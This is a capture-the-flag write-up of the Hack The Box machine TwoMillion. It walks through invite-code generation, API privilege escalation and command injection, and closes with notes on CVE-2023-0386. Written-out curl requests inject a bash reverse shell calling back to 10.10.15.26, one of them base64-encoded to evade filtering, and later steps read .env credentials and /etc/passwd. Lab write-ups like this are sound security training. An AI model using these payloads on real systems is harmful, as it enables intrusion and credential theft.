---
title: TwoMillion
date: 2026-03-24
category: [HackTheBox, Linux, Web Exploitation]
tags: [nmap, ffuf]
difficulty: Easy
summary: TwoMillion is an easy rated box on Hack The Box
---

[Link to machine.](https://app.hackthebox.com/machines/TwoMillion)
## Reconnaissance
Start with a nmap scan:
```bash
sudo nmap -sVC -vv -p- --min-rate 5000 -oN twomillion-nmap <IP>
```
![Pasted image 20260323213917](../Images/Pasted%20image%2020260323213917.png)
Found a nginx Web server running at port 80 resolves to a host named `2million.htb/`, add the hostname and IP pair into /etc/hosts to reach the website.
## Enumeration
Directory fuzzing with ffuf:
```bash
ffuf -u http://2million.htb/FUZZ -w ../SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt > 2million-dirfuzz
```
While waiting for the fuzzing to complete, I found a login page like so:
![Pasted image 20260323214439](../Images/Pasted%20image%2020260323214439.png)
Tried intercept the login process with Burp Suite, got that the Login function sends a POST request to an api at `/api/vi/user/login`:
![Pasted image 20260323215443](../Images/Pasted%20image%2020260323215443.png)
Can't get any useful informations out of that error message, the error parameter on the url doesn't seem to be injectable also.
Filtering the fuzzed directories with Status code 200 showed me two other potential target which is the hidden `/register` and `/invite`:
![Pasted image 20260323221114](../Images/Pasted%20image%2020260323221114.png)
![Pasted image 20260323221813](../Images/Pasted%20image%2020260323221813.png)
![Pasted image 20260323221827](../Images/Pasted%20image%2020260323221827.png)  
Nvm the `/invite` page wasn't hidden it's just that I've skipped the part in the FAQ that redirect me to it:
![Pasted image 20260323222040](../Images/Pasted%20image%2020260323222040.png)
The answer shows that the `/invite` is an entry-level challenge that I have to solve in order to join the "Hack The Box".
Okay so it seems like I can't register until I've found the invite code
![Pasted image 20260323222508](../Images/Pasted%20image%2020260323222508.png)
![Pasted image 20260323222713](../Images/Pasted%20image%2020260323222713.png)
Cause the invite code is sticked into my register data. How about trying some SQL injection? It could be that the server might query from the invite code database maybe. No it doesn't seem to be vulnerable to SQL injection.
So by inspecting the page source, I saw that the application does include some JavaScript scripts 
![Pasted image 20260323225025](../Images/Pasted%20image%2020260323225025.png)  
One of them named `inviteapi.min.js`, so this could be the one that has to mess with those invite codes. When I checked the script file, the code inside seems to be obfuscated (Nah it just because I don't really understand 100% of them so I asked Copilot and it says that they are obfuscated, and of course it does show me the plain one). So inside the `/js/inviteapi.min.js` they declare two functions: `verifyInviteCode` (which does the job to send the data to an endpoint at `/api/v1/invite/verify`), `makeInviteCode`, which sends the data to an endpoint at `/api/v1/invite/how/to/generate`. So by the name of it, then it should do what I think it can do. So I write a simple curl request to that endpoint:
```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate -d '{"code": "hahaha"}'
```
![Pasted image 20260323225941](../Images/Pasted%20image%2020260323225941.png)
The response data after decrypted:
`In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`
So it looks like we are on the right track, I supposed this one is gonna be the real endpoint to generate myself an invite code.
![Pasted image 20260323230327](../Images/Pasted%20image%2020260323230327.png)
Okay so we've finally got ourself the invite code, I think we are able to register now using the decoded code (base64).
![Pasted image 20260323230534](../Images/Pasted%20image%2020260323230534.png)  
After done registering and logging in, I ended of in a homepage:
![Pasted image 20260323230810](../Images/Pasted%20image%2020260323230810.png)
So now I've known that there is an exposed api endpoint that can change user's settings, which may be used to escalate my account to admin user.
Okay, so together with firing the PUT request to the api endpoint, I also have to include the sessionID cookie.
```bash
curl -sv -X http://2million.htb/api/v1/admin/settings/update --cookie 'PHPSESSID=khnnchvs29h13u9q0o7qkq0u8d'
```
![Pasted image 20260324092026](../Images/Pasted%20image%2020260324092026.png)
Okay so it's easier now that we can see how server response. The response message indicating "Invalid content type". So we should specify content type in the header. Since those apis currently returning json format, I added content type application/json to the header:
```bash
curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie 'PHPSESSID=khnnchvs29h13u9q0o7qkq0u8d' -H "Content-Type: application/json"
```
![Pasted image 20260324092400](../Images/Pasted%20image%2020260324092400.png)
Okay so now we need to specify parameters in our request data. The email might be the identifier one, earlier, when curling to `/api/v1/user/auth` endpoint I got
`{"loggedin":true,"username":"haha","is_admin":0}`
So maybe the is_admin could be a parameter too
```bash
curl -sv -X PUT http://2million.htb/api/v1/admin/settings/update --cookie 'PHPSESSID=khnnchvs29h13u9q0o7qkq0u8d' -d '{"email": "haha@haha.com", "is_admin": 1}' -H "Content-Type: application/json"
```
![Pasted image 20260324092630](../Images/Pasted%20image%2020260324092630.png)
So now that our account is made admin, we can use those admin api endpoints where one of them is flagged as command injectable. 
Okay before trying to send those reverse shell payload, remember to open netcat listener.
```bash
curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie 'PHPSESSID=khnnchvs29h13u9q0o7qkq0u8d' -d '{"username": "haha;id;"}' -H "Content-Type: application/json"
```
![Pasted image 20260324094824](../Images/Pasted%20image%2020260324094824.png)
Okay so the generate vpn api does throw the input username into some sort of `exec` or `system` command, so it is likely injectable.
```bash
curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie 'PHPSESSID=khnnchvs29h13u9q0o7qkq0u8d' -d '{"username": haha;bash -i >& /dev/tcp/10.10.15.26/44444 0>&1;"}' -H "Content-Type: application/json"
```
Thowing the reverse shell bash straight into the data field returns no good result:
![Pasted image 20260324095047](../Images/Pasted%20image%2020260324095047.png)
It is saying here that I'm missing the parameter "username" while I've already included in the data field, it may indicate that the data is being filtered somehow. So there is one other way around is that we encode the payload and then decode and run it on the target:
```bash
curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie 'PHPSESSID=khnnchvs29h13u9q0o7qkq0u8d' -d '{"username": "haha;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNi80NDQ0NCAwPiYx | base64 -d | bash;"}' -H "Content-Type: application/json"
```
Here the payload is being encoded in base64 and then decoded and run on the target. FInally we got the reverse shell as the result.
So the next hint they suggest about a file called `.env` which stores environment variables of PHP applications. So we try read what's inside:
![Pasted image 20260324095537](../Images/Pasted%20image%2020260324095537.png)
So this likely is the credentials for database connection in the backend.
Dumping the `/etc/passwd` There is indeed a user named `admin`. So maybe we can use these creds to ssh into the machine with this username?
![Pasted image 20260324095742](../Images/Pasted%20image%2020260324095742.png)
![Pasted image 20260324095915](../Images/Pasted%20image%2020260324095915.png)
The next steps to get the root is by exploiting the CVE in OverlayFS (CVE-2023-0386)
## CVE-2023-0386
OverlayFS is a feature to map upper, lower file system into one unified mounting point.
The flow of the OverlayFS can be simplified as:
One unified `/merge` file system. `/upper` file system for writing, `/lower` one for read-only.
- Files in `/lower` will then be transfered to the unified `/merge`
- Files written in `/upper` does so.
- Files in `/merge` then will be copied into `/upper`
So the critical thing here is that the current version of the kernel doesn't sanitize the metadata of those copied files, which mean those permissions bit that are set on the copied file stays the same even if it has been moved to a new namespace.
## Summary

